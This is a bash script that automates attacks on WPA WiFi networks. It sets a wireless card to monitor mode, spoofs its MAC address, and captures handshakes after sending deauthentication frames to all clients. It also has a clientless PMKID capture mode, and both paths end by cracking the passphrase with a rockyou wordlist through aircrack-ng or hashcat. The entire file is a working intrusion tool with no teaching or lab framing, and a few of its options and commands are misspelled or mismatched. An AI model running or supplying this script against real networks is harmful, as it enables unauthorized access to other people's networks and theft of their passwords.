#!/bin/bash


#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Make installation of packages noninteractive
export DEBIAN_FRONTEND=noninteractive


#Command to capture the key combination of CTRL + C
trap ctrl_c INT

#Function to get  ctrl_c
function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Exiting...${endColour}"
	tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
	rm Captura* 2>/dev/null
	exit 0
}

#Function banner
function banner(){
  
  echo -e "\n${purpleColour}█     █░ ██▓███   █     █░███▄    █"
  sleep 0.05
  echo -e "▓█░ █ ░█░▓██░  ██▒▓█░ █ ░█░██ ▀█   █"
  sleep 0.05
  echo -e "▒█░ █ ░█ ▓██░ ██▓▒▒█░ █ ░█▓██  ▀█ ██▒"
  sleep 0.05
  echo -e "░█░ █ ░█ ▒██▄█▓▒ ▒░█░ █ ░█▓██▒  ▐▌██▒"
  sleep 0.05
  echo -e "░░██▒██▓ ▒██▒ ░  ░░░██▒██▓▒██░   ▓██░"
  sleep 0.05
  echo -e "░ ▓░▒ ▒  ▒▓▒░ ░  ░░ ▓░▒ ▒ ░ ▒░   ▒ ▒ "
  sleep 0.05
  echo -e "  ▒ ░ ░  ░▒ ░       ▒ ░ ░ ░ ░░   ░ ▒░"
  sleep 0.05
  echo -e "  ░   ░  ░░         ░   ░    ░   ░ ░ "
  sleep 0.05
  echo -e "    ░                 ░            ░ ${endColour}\n"
  sleep 0.5
  echo -e "${yellowColour}Made by ${endColour}${purpleColour}(${endColour}${greenColour}Eur1p3des${endColour}${purpleColour})${endColour}\n\n"  

}
#Function for the help panel
function helpPanel(){
    banner
    echo -e "\e${yellowColour}[*]${endColour}${grayColour} Using: ./wifi.sh${endColour}"
    echo -e "\t${purpleColour}a)${endColour}${yellowColour} Attack mode${endColour}"
    echo -e "\t\t${grayColour}Handshake${endColour}"
    echo -e "\t\t${grayColour}PKMID${endColour}"
    echo -e "\t${purpleColour}b)${endColour}${yellowColour} Networkcard name${endColour}"
    echo -e "\t${purpleColour}h)${endColour}${yellowColour} Show help pannel${endColour}\n"
    exit 0
}

#Function to check if the user has the necessary packages
function dependencies(){
    #Make the cursor invisible
    tput civis
    
    clear; dependencies=(aircrack-ng macchanger xterm hashcat)
    
    echo -ne "${yellowColour}[*]${endColour}${grayColour} Checking for the required packages...${endColour}\n"
    sleep 2
    
    for program in "${dependencies[@]}"; do
        echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Tool ${endColour}${purpleColour}$program${endColour}${blueColour}... ${endColour}"
        test -f /usr/bin/$program
        
        if [ "$(echo $?)" == "0" ]; then
            echo -e "${greenColour}(V)${endColour}\n"
        else
            echo -e "${redColour}(X)${endColour}\n"
            echo -e "${yellowColour}[*]${endColour}${blueColour} Installing tool ${endColour}${purpleColour}$program${endColour}${blueColour} ...${endColour}\n"
            apt-get install $program -y > /dev/null 2>&1
        fi; sleep 1
        
    done
}

#Function to start the attack
function startAttack(){
    clear
    echo -e "${yellowColour}[*]${endColour}${grayColour} Setting up networdcard...${endColour}\n"
    airmon-ng start $networkCard > /dev/null 2>&1
    ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
    ifconfig ${networkCard}mon up;  killall dhclient wpa_supplicant 2>/dev/null
    
    echo -e "${yellowColour}[*]${endColour}${grayColour} New MAC address ${endColour}${purpleColour}(${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100'${endColour})${purpleColour})${endColour}"
    
    if [ "$(echo $attack_mode)" == "Handshake" ]; then
        clear
        xterm -hold -e "airodump-ng ${networkCard}" &
        airodump_xterm_PID=$!
        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Access point name: ${endColour}" && read apName
        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Access point channel: ${endColour}" && read apChannel
        
        kill -9 $airodump_xterm_PID
        wait $airodump_xterm_PID 2>/dev/null
        
        xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &
        airodump_filter_xterm_PID=$!
        
        sleep 5; xterm -hold -e "aireplay-ng -0 10  -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
        aireplay_xterm_PID=$!
        sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
        
        
        sleep 10; kill -9 $airodump_filter_xterm_PID
        wait $airodump_filter_xterm_PID 2>/dev/null
        
        xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
        
    elif [ "$(echo $attack_mode)" == "PKMID" ]; then
        clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Starting Clientless PKMID Attack...${endColour}\n"
        timeout 60 hcsdumptool -i ${networkCard}mon --enable_estatus=1 -o Captura
        echo -e "${yellowColour}[*]${endColour}${grayColour} Obtaining Hashes...${endColour}\n"
        sleep 2
        hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
        
        test -f myHashes

        if [ "$(echo $?)" == "0" ]; then
          echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Starting brute force process...${endColour}\n"
          sleep 2

          hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
        else
          echo -e "\n${redColour}[!]${endColour}${grayColour} Necessary package could not be found...${endColour}\n"
          sleep 2
        fi
    else
        echo -e "\n${yellowColour}[*] ${endColour}${redColour} Unvalid attack mode${endColour}\n"
    fi
}

#Main Function
if [ "$(id -u)"  == "0" ]; then
    declare -i parameter_counter=0; while getopts ":a:n:h:"  arg; do
        case $arg in
            a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
            n) networkCard=$OPTARG; let parameter_counter+=1 ;;
            h) helpPanel;;
        esac
    done
    
    if [ $parameter_counter -ne 2 ]; then
        helpPanel
    else
        banner; sleep 2
        dependencies
        startAttack
        tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
    fi
    
else
    echo -e "\n${yellowColour}[*] ${endColour}${redColour}This program must be run as root${endColour}\n"
fi
